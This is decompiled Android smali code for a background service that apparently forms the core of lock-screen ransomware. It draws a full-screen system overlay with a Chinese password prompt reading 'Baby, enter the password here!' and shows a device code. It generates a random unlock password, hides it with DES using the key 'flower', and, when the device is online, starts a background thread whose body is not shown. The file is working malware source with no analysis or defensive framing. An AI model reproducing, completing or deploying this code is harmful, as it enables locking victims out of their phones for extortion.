.class public Lcom/h/s;
.super Landroid/app/Service;
.source "s.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/h/s$100000000;,
        Lcom/h/s$100000001;
    }
.end annotation


# instance fields
.field bt:Landroid/widget/Button;

.field des:Lcom/h/DU;

.field ed:Landroid/widget/EditText;

.field editor:Landroid/content/SharedPreferences$Editor;

.field private mFloatLayout:Landroid/view/View;

.field private mWindowManager:Landroid/view/WindowManager;

.field nr:Landroid/widget/TextView;

.field pass:J

.field passw:Ljava/lang/Long;

.field password:Ljava/lang/String;

.field ppss:Ljava/lang/String;

.field share:Landroid/content/SharedPreferences;

.field tv:Landroid/widget/TextView;

.field private wmParams:Landroid/view/WindowManager$LayoutParams;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 246
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$L1000001(Lcom/h/s;)Landroid/view/WindowManager;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->mWindowManager:Landroid/view/WindowManager;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000002(Lcom/h/s;)Landroid/view/View;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$S1000001(Lcom/h/s;Landroid/view/WindowManager;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/h/s;->mWindowManager:Landroid/view/WindowManager;

    return-void
.end method

.method static synthetic access$S1000002(Lcom/h/s;Landroid/view/View;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    return-void
.end method

.method private c()V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 124
    move-object v0, p0

    move-object v7, v0

    new-instance v8, Landroid/view/WindowManager$LayoutParams;

    move-object v13, v8

    move-object v8, v13

    move-object v9, v13

    invoke-direct {v9}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v8, v7, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 126
    move-object v7, v0

    move-object v8, v0

    invoke-virtual {v8}, Lcom/h/s;->getApplication()Landroid/app/Application;

    move-result-object v8

    move-object v9, v0

    invoke-virtual {v9}, Lcom/h/s;->getApplication()Landroid/app/Application;

    move-result-object v9

    sget-object v9, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual {v8, v9}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/WindowManager;

    iput-object v8, v7, Lcom/h/s;->mWindowManager:Landroid/view/WindowManager;

    .line 129
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v8, 0x7da

    iput v8, v7, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 137
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v8, 0x1

    iput v8, v7, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 143
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v8, 0x500

    iput v8, v7, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 150
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v8, 0x31

    iput v8, v7, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 152
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v8, 0x0

    iput v8, v7, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 153
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v8, 0x0

    iput v8, v7, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 155
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v8, -0x1

    iput v8, v7, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 156
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v8, -0x1

    iput v8, v7, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 161
    move-object v7, v0

    invoke-virtual {v7}, Lcom/h/s;->getApplication()Landroid/app/Application;

    move-result-object v7

    invoke-static {v7}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v7

    move-object v1, v7

    .line 163
    move-object v7, v0

    move-object v8, v1

    const v9, 0x7f030001

    const/4 v10, 0x0

    check-cast v10, Landroid/view/ViewGroup;

    invoke-virtual {v8, v9, v10}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v8

    iput-object v8, v7, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    .line 167
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->mWindowManager:Landroid/view/WindowManager;

    move-object v8, v0

    iget-object v8, v8, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    move-object v9, v0

    iget-object v9, v9, Lcom/h/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v7, v8, v9}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 168
    move-object v7, v0

    move-object v8, v0

    iget-object v8, v8, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    const v9, 0x7f0a0002

    invoke-virtual {v8, v9}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/Button;

    iput-object v8, v7, Lcom/h/s;->bt:Landroid/widget/Button;

    .line 169
    move-object v7, v0

    move-object v8, v0

    iget-object v8, v8, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    const v9, 0x7f0a0001

    invoke-virtual {v8, v9}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/EditText;

    iput-object v8, v7, Lcom/h/s;->ed:Landroid/widget/EditText;

    .line 170
    move-object v7, v0

    move-object v8, v0

    iget-object v8, v8, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    const/high16 v9, 0x7f0a0000

    invoke-virtual {v8, v9}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/TextView;

    iput-object v8, v7, Lcom/h/s;->tv:Landroid/widget/TextView;

    .line 171
    move-object v7, v0

    move-object v8, v0

    iget-object v8, v8, Lcom/h/s;->mFloatLayout:Landroid/view/View;

    const v9, 0x7f0a0003

    invoke-virtual {v8, v9}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/TextView;

    iput-object v8, v7, Lcom/h/s;->nr:Landroid/widget/TextView;

    .line 175
    move-object v7, v0

    :try_start_0
    invoke-virtual {v7}, Lcom/h/s;->getResources()Landroid/content/res/Resources;

    move-result-object v7

    const v8, 0x7f060001

    invoke-virtual {v7, v8}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v7

    move-object v2, v7

    .line 176
    new-instance v7, Ljava/io/InputStreamReader;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v2

    const-string v10, "UTF-8"

    invoke-direct {v8, v9, v10}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    move-object v3, v7

    .line 177
    new-instance v7, Ljava/io/BufferedReader;

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v9, v3

    invoke-direct {v8, v9}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v4, v7

    .line 178
    const-string v7, ""

    move-object v5, v7

    .line 179
    :goto_0
    move-object v7, v4

    invoke-virtual {v7}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v7

    move-object v13, v7

    move-object v7, v13

    move-object v8, v13

    move-object v5, v8

    if-nez v7, :cond_0

    .line 189
    :goto_1
    move-object v7, v0

    :try_start_1
    iget-object v7, v7, Lcom/h/s;->ed:Landroid/widget/EditText;

    const-string v8, "\u5b9d\u8d1d\u5728\u8fd9\u8f93\u5165\u5bc6\u7801\uff01"

    invoke-virtual {v7, v8}, Landroid/widget/EditText;->setHint(Ljava/lang/CharSequence;)V

    .line 190
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->tv:Landroid/widget/TextView;

    const-string v8, "\u81ea\u5b9a\u4e49\u5de5\u5382\u5236\u4f5c"

    invoke-virtual {v7, v8}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 194
    :goto_2
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->bt:Landroid/widget/Button;

    new-instance v8, Lcom/h/s$100000001;

    move-object v13, v8

    move-object v8, v13

    move-object v9, v13

    move-object v10, v0

    invoke-direct {v9, v10}, Lcom/h/s$100000001;-><init>(Lcom/h/s;)V

    invoke-virtual {v7, v8}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 227
    move-object v7, v0

    :try_start_2
    iget-object v7, v7, Lcom/h/s;->tv:Landroid/widget/TextView;

    new-instance v8, Ljava/lang/StringBuffer;

    move-object v13, v8

    move-object v8, v13

    move-object v9, v13

    invoke-direct {v9}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v9, Ljava/lang/StringBuffer;

    move-object v13, v9

    move-object v9, v13

    move-object v10, v13

    invoke-direct {v10}, Ljava/lang/StringBuffer;-><init>()V

    const-string v10, "\n"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v9

    move-object v10, v0

    iget-object v10, v10, Lcom/h/s;->des:Lcom/h/DU;

    const-string v11, "e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c"

    invoke-virtual {v10, v11}, Lcom/h/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v8

    move-object v9, v0

    iget-object v9, v9, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    const-string v10, "m"

    const/4 v11, 0x0

    int-to-long v11, v11

    invoke-interface {v9, v10, v11, v12}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v9

    invoke-virtual {v8, v9, v10}, Ljava/lang/StringBuffer;->append(J)Ljava/lang/StringBuffer;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :goto_3
    return-void

    .line 180
    :cond_0
    :try_start_3
    const-string v7, "info"

    move-object v8, v5

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    move-result v7

    .line 181
    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->nr:Landroid/widget/TextView;

    move-object v8, v5

    invoke-virtual {v7, v8}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_0

    .line 179
    :catch_0
    move-exception v7

    move-object v2, v7

    .line 185
    move-object v7, v2

    invoke-virtual {v7}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 190
    :catch_1
    move-exception v7

    move-object v2, v7

    goto :goto_2

    .line 227
    :catch_2
    move-exception v7

    move-object v2, v7

    goto :goto_3
.end method


# virtual methods
.method public is(Landroid/content/Context;)Z
    .locals 7

    .prologue
    .line 235
    move-object v0, p0

    move-object v1, p1

    move-object v5, v1

    if-eqz v5, :cond_0

    .line 237
    move-object v5, v1

    const-string v6, "connectivity"

    invoke-virtual {v5, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/net/ConnectivityManager;

    move-object v2, v5

    .line 239
    move-object v5, v2

    invoke-virtual {v5}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v5

    move-object v3, v5

    .line 240
    move-object v5, v3

    if-eqz v5, :cond_0

    .line 242
    move-object v5, v3

    invoke-virtual {v5}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v5

    move v0, v5

    .line 245
    :goto_0
    return v0

    :cond_0
    const/4 v5, 0x0

    move v0, v5

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 36
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onCreate()V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 43
    move-object v0, p0

    move-object v3, v0

    invoke-super {v3}, Landroid/app/Service;->onCreate()V

    .line 44
    move-object v3, v0

    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v4

    const v6, 0x5f5e100

    int-to-double v6, v6

    mul-double/2addr v4, v6

    double-to-long v4, v4

    iput-wide v4, v3, Lcom/h/s;->pass:J

    .line 45
    move-object v3, v0

    move-object v4, v0

    iget-wide v4, v4, Lcom/h/s;->pass:J

    const/4 v6, 0x1

    int-to-long v6, v6

    add-long/2addr v4, v6

    new-instance v6, Ljava/lang/Long;

    move-wide v9, v4

    move-object v11, v6

    move-object v4, v11

    move-wide v5, v9

    move-object v7, v11

    move-wide v9, v5

    move-object v11, v7

    move-object v5, v11

    move-wide v6, v9

    move-object v8, v11

    invoke-direct {v5, v6, v7}, Ljava/lang/Long;-><init>(J)V

    iput-object v4, v3, Lcom/h/s;->passw:Ljava/lang/Long;

    .line 47
    move-object v3, v0

    new-instance v4, Lcom/h/DU;

    move-object v9, v4

    move-object v4, v9

    move-object v5, v9

    const-string v6, "flower"

    invoke-direct {v5, v6}, Lcom/h/DU;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Lcom/h/s;->des:Lcom/h/DU;

    .line 50
    move-object v3, v0

    :try_start_0
    new-instance v4, Lcom/h/DU;

    move-object v9, v4

    move-object v4, v9

    move-object v5, v9

    move-object v6, v0

    iget-object v6, v6, Lcom/h/s;->des:Lcom/h/DU;

    const-string v7, "c29fe56fa59ab0db"

    invoke-virtual {v6, v7}, Lcom/h/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Lcom/h/DU;-><init>(Ljava/lang/String;)V

    iput-object v4, v3, Lcom/h/s;->des:Lcom/h/DU;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 54
    :goto_0
    move-object v3, v0

    move-object v4, v0

    const-string v5, "Flowers"

    const/4 v6, 0x0

    invoke-virtual {v4, v5, v6}, Lcom/h/s;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    iput-object v4, v3, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    .line 55
    move-object v3, v0

    move-object v4, v0

    iget-object v4, v4, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    iput-object v4, v3, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    .line 56
    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    const-string v4, "m"

    const/4 v5, 0x0

    int-to-long v5, v5

    invoke-interface {v3, v4, v5, v6}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v3

    const/4 v5, 0x0

    int-to-long v5, v5

    cmp-long v3, v3, v5

    if-nez v3, :cond_0

    .line 59
    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v4, "m"

    move-object v5, v0

    iget-wide v5, v5, Lcom/h/s;->pass:J

    invoke-interface {v3, v4, v5, v6}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 60
    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result v3

    .line 63
    move-object v3, v0

    :try_start_1
    iget-object v3, v3, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v4, "passw"

    move-object v5, v0

    iget-object v5, v5, Lcom/h/s;->des:Lcom/h/DU;

    new-instance v6, Ljava/lang/StringBuffer;

    move-object v9, v6

    move-object v6, v9

    move-object v7, v9

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    const-string v7, ""

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v0

    iget-object v7, v7, Lcom/h/s;->passw:Ljava/lang/Long;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lcom/h/DU;->encrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 64
    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result v3

    .line 68
    :goto_1
    move-object v3, v0

    move-object v4, v0

    invoke-virtual {v4}, Lcom/h/s;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v3, v4}, Lcom/h/s;->is(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 70
    move-object v3, v0

    new-instance v4, Ljava/lang/StringBuffer;

    move-object v9, v4

    move-object v4, v9

    move-object v5, v9

    invoke-direct {v5}, Ljava/lang/StringBuffer;-><init>()V

    move-object v5, v0

    iget-object v5, v5, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    const-string v6, "m"

    const/16 v7, 0x8

    int-to-long v7, v7

    invoke-interface {v5, v6, v7, v8}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v5

    invoke-virtual {v4, v5, v6}, Ljava/lang/StringBuffer;->append(J)Ljava/lang/StringBuffer;

    move-result-object v4

    const-string v5, ""

    invoke-virtual {v4, v5}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/h/s;->ppss:Ljava/lang/String;

    .line 73
    move-object v3, v0

    move-object v4, v0

    :try_start_2
    iget-object v4, v4, Lcom/h/s;->des:Lcom/h/DU;

    move-object v5, v0

    iget-object v5, v5, Lcom/h/s;->share:Landroid/content/SharedPreferences;

    const-string v6, "passw"

    const-string v7, ""

    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lcom/h/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/h/s;->password:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 77
    :goto_2
    new-instance v3, Lcom/h/s$100000000;

    move-object v9, v3

    move-object v3, v9

    move-object v4, v9

    move-object v5, v0

    invoke-direct {v4, v5}, Lcom/h/s$100000000;-><init>(Lcom/h/s;)V

    invoke-virtual {v3}, Lcom/h/s$100000000;->start()V

    .line 97
    :cond_0
    :goto_3
    return-void

    .line 50
    :catch_0
    move-exception v3

    move-object v1, v3

    goto/16 :goto_0

    .line 64
    :catch_1
    move-exception v3

    move-object v1, v3

    goto :goto_1

    .line 73
    :catch_2
    move-exception v3

    move-object v1, v3

    goto :goto_2

    .line 94
    :cond_1
    move-object v3, v0

    :try_start_3
    iget-object v3, v3, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v4, "m"

    move-object v5, v0

    iget-object v5, v5, Lcom/h/s;->des:Lcom/h/DU;

    const-string v6, "5a15e58cc8db8d1c700ecb6bb7b627a9"

    invoke-virtual {v5, v6}, Lcom/h/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v5

    invoke-interface {v3, v4, v5, v6}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 95
    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result v3

    .line 96
    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v4, "passw"

    const-string v5, "5a15e58cc8db8d1c700ecb6bb7b627a9"

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 97
    move-object v3, v0

    iget-object v3, v3, Lcom/h/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    move-result v3

    goto :goto_3

    :catch_3
    move-exception v3

    move-object v1, v3

    goto :goto_3
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Intent;",
            "I)V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 109
    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move-object v4, v0

    move-object v5, v1

    move v6, v2

    invoke-super {v4, v5, v6}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 110
    move-object v4, v0

    invoke-direct {v4}, Lcom/h/s;->c()V

    return-void
.end method
